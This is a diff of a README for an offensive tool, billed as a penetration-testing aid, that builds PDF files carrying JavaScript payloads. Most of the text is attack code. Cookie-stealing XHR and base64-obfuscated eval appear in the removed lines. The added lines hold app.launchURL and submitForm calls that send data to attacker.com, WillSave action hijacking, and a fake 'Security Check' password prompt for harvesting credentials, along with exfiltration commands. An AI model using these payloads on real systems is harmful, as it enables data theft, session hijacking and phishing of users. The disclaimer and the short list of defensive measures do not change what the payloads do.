@@ -1,35 +1,47 @@
-# XSS-PDF Generator
+# XSS-PDF Generator - Advanced PDF Sandbox Escape Tool
 
-An advanced tool for generating PDF files containing various XSS (Cross-Site Scripting) payloads for security testing and penetration testing purposes.
+An advanced tool for generating PDF files with sophisticated JavaScript payloads designed to escape PDF sandbox environments. This tool creates PDF files containing various sandbox escape techniques for security testing and penetration testing purposes.
 
 ## ⚠️ Legal Disclaimer
 
 This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.
 
+## 🔒 PDF Sandbox Context
+
+PDF files are typically rendered in sandboxed environments that restrict access to:
+- Browser DOM APIs (document.cookie, XMLHttpRequest, etc.)
+- File system access through standard web APIs
+- Direct network communication through browser APIs
+
+This tool implements **PDF-specific JavaScript APIs** and **sandbox escape techniques** to overcome these limitations.
+
 ## 🚀 Features
 
-- **10 Different XSS Payload Types**: Comprehensive collection of XSS attack vectors
-- **URL Integration**: Support for data exfiltration to external URLs
-- **Custom Payloads**: Ability to inject custom JavaScript code
+- **12 Different PDF Sandbox Escape Types**: Comprehensive collection of PDF-specific attack vectors
+- **PDF-Specific JavaScript APIs**: Uses proper PDF JavaScript context instead of browser APIs
+- **Multiple Sandbox Escape Techniques**: URL launching, form submission, dialog manipulation
+- **URL Integration**: Support for data exfiltration to external URLs via PDF escape methods
+- **Custom Payloads**: Ability to inject custom PDF JavaScript code
+- **Enhanced PDF Structure**: Sophisticated PDF structure for better escape potential
 - **Multiple Output Formats**: PDF and HTML file generation
 - **Timestamped Files**: Automatic file naming with timestamps
-- **Type-Specific Generation**: Generate specific payload types or all at once
-- **Backward Compatibility**: Maintains compatibility with legacy usage
 
-## 📋 Available XSS Payload Types
+## 📋 Available PDF Sandbox Escape Types
 
-| Type | Description | Use Case |
-|------|-------------|----------|
-| `alert` | Basic alert payload | Simple XSS validation |
-| `cookie` | Cookie stealing payload | Session hijacking simulation |
-| `redirect` | Redirect/phishing payload | Phishing attack simulation |
-| `form` | Form data exfiltration payload | Data theft simulation |
-| `dom` | DOM manipulation payload | Page defacement testing |
-| `obfuscated` | Obfuscated payload (Base64) | Bypass filter testing |
-| `timer` | Time-based payload | Persistent XSS testing |
-| `keylog` | Keylogger payload | Keystroke capture simulation |
-| `network` | Network request payload | External communication testing |
-| `file` | File system/storage access payload | Local storage access testing |
+| Type | Description | Escape Method |
+|------|-------------|---------------|
+| `alert` | Basic PDF alert payload | PDF JavaScript execution test |
+| `cookie` | PDF data exfiltration | Form submission + URL launching |
+| `redirect` | PDF URL launching escape | app.launchURL() sandbox escape |
+| `form` | PDF form submission escape | this.submitForm() data exfiltration |
+| `dom` | PDF document manipulation | PDF property and state manipulation |
+| `obfuscated` | Obfuscated PDF payload | Encoded PDF JavaScript |
+| `timer` | PDF timer-based escape | app.setTimeOut() and action scheduling |
+| `keylog` | PDF event monitoring | PDF action and field event hijacking |
+| `network` | PDF network sandbox escape | URL launching + form submission |
+| `file` | PDF file system escape | browseForDoc, saveAs, print exploitation |
+| `action` | PDF action-based escape | Document action hijacking |
+| `dialog` | PDF dialog manipulation | Dialog exploitation for credential harvesting |
 
 ## 🛠️ Installation & Requirements
 
@@ -67,23 +79,26 @@ python3 script.py -t all
 python3 script.py -o html
 ```
 
-### Advanced Usage
+### Advanced PDF Sandbox Escape Usage
 
 ```bash
-# Cookie stealer with data exfiltration URL
+# PDF data exfiltration via form submission escape
 python3 script.py -t cookie -u http://attacker.com/collect
 
-# Generate all payloads with URL for data exfiltration
+# PDF action-based sandbox escape
+python3 script.py -t action -u http://collaborator.burpsuite.com
+
+# PDF dialog manipulation for credential harvesting
+python3 script.py -t dialog -u http://logger.example.com
+
+# PDF file system escape attempts
+python3 script.py -t file
+
+# Generate all PDF sandbox escape types
 python3 script.py -t all -u http://collaborator.burpsuite.com
 
-# Custom JavaScript payload
-python3 script.py -s "app.alert('Custom XSS'); document.location='http://evil.com'"
-
-# Network request to specific endpoint
-python3 script.py -t network -u https://httpbin.org/post
-
-# Keylogger with data exfiltration
-python3 script.py -t keylog -u http://logger.example.com/keys
+# PDF network escape via URL launching
+python3 script.py -t network -u https://webhook.site/unique-id
 ```
 
 ## 🏁 Command Line Flags
@@ -113,51 +128,63 @@ Generated HTML files follow the naming convention: `xss_test_<timestamp>.html`
 Example:
 - `xss_test_20240115_143035.html`
 
-## 🎯 Payload Examples
+## 🎯 PDF Sandbox Escape Examples
 
-### Basic Alert
+### PDF Form Submission Escape
 ```javascript
-app.alert('XSS Test - Basic Alert');
+// PDF-specific data exfiltration
+this.submitForm({
+    cURL: "http://attacker.com/collect",
+    cSubmitAs: "HTML",
+    cCharset: "utf-8"
+});
 ```
 
-### Cookie Stealing
+### PDF URL Launching Escape
 ```javascript
-var cookies = document.cookie;
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "http://attacker.com/collect", true);
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-xhr.send("cookies=" + encodeURIComponent(cookies));
+// Escape sandbox via URL launching
+app.launchURL("http://attacker.com/escape?data=" + encodeURIComponent(data), true);
 ```
 
-### DOM Manipulation
+### PDF Action Hijacking
 ```javascript
-document.body.style.backgroundColor = "red";
-document.body.innerHTML = "<h1>XSS - DOM Hijacked!</h1>";
+// Hijack document actions for persistent escape
+this.setAction("WillSave", 
+    "app.launchURL('http://attacker.com/save-intercept', true);"
+);
 ```
 
-### Obfuscated Payload
+### PDF Dialog Exploitation
 ```javascript
-var obf = "YXBwLmFsZXJ0KCJPYmZ1c2NhdGVkIFhTUyBwYXlsb2FkIGV4ZWN1dGVkIik=";
-eval(atob(obf));
+// Credential harvesting via PDF dialogs
+var creds = app.response({
+    cQuestion: "Enter your credentials:",
+    cTitle: "Security Check",
+    bPassword: true
+});
 ```
 
-## 🔍 Testing Methodology
+## 🔍 PDF Security Testing Methodology
 
-1. **Generate Test Files**: Use the tool to create PDF files with various XSS payloads
-2. **Upload/Embed**: Test file upload functionality on target applications
-3. **Monitor Responses**: Check for JavaScript execution in PDF viewers
-4. **Data Exfiltration**: Use URL flag to test data extraction capabilities
-5. **Filter Bypass**: Test obfuscated payloads against security filters
+1. **Generate PDF Test Files**: Use the tool to create PDF files with various sandbox escape payloads
+2. **Upload/Embed Testing**: Test file upload functionality on target applications
+3. **PDF Viewer Analysis**: Test different PDF viewers (Adobe Reader, browser built-ins, etc.)
+4. **Sandbox Escape Monitoring**: Monitor for successful escapes via URL launching, form submission
+5. **Data Exfiltration Testing**: Use URL flag to test actual data extraction capabilities
+6. **Action Persistence Testing**: Test if PDF actions persist across viewer sessions
+7. **Dialog Security Testing**: Test credential harvesting via PDF dialog manipulation
 
-## 🛡️ Defensive Measures
+## 🛡️ PDF-Specific Defensive Measures
 
-To protect against XSS-PDF attacks:
+To protect against PDF sandbox escape attacks:
 
-- Disable JavaScript in PDF viewers
-- Implement strict file upload validation
-- Use Content Security Policy (CSP) headers
-- Sanitize and validate all user inputs
-- Regular security testing and code reviews
+- **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
+- **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
+- **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
+- **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes
+- **Content Security Policy**: Implement CSP headers that restrict PDF-initiated requests
+- **PDF Content Analysis**: Scan uploaded PDFs for JavaScript and suspicious structures
+- **User Education**: Train users on PDF security risks and safe viewing practices
 
 ## 🚨 Security Considerations
 
@@ -169,14 +196,17 @@ To protect against XSS-PDF attacks:
 
 ## 📈 Changelog
 
-### Version 2.0 (Current)
-- Added 10 different XSS payload types
-- Implemented type-specific generation with `-t` flag
-- Enhanced URL integration for data exfiltration
-- Added comprehensive help and documentation
-- Improved file naming with timestamps
-- Added HTML output format
-- Enhanced error handling and validation
+### Version 3.0 (Current) - PDF Sandbox Escape Enhancement
+- **Complete rewrite for PDF sandbox context**
+- **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
+- **12 sophisticated sandbox escape techniques**
+- **Enhanced PDF structure**: More complex PDF objects for better escape potential
+- **Action-based persistence**: PDF action hijacking for persistent attacks
+- **Dialog exploitation**: Credential harvesting via PDF dialogs
+- **Form submission escapes**: Data exfiltration via PDF form submission
+- **URL launching escapes**: Sandbox escape via app.launchURL()
+- **File system escape attempts**: PDF-specific file access methods
+- **Comprehensive error handling for PDF context**
 
 ### Version 1.0 (Legacy)
 - Basic PDF generation with simple XSS payloads
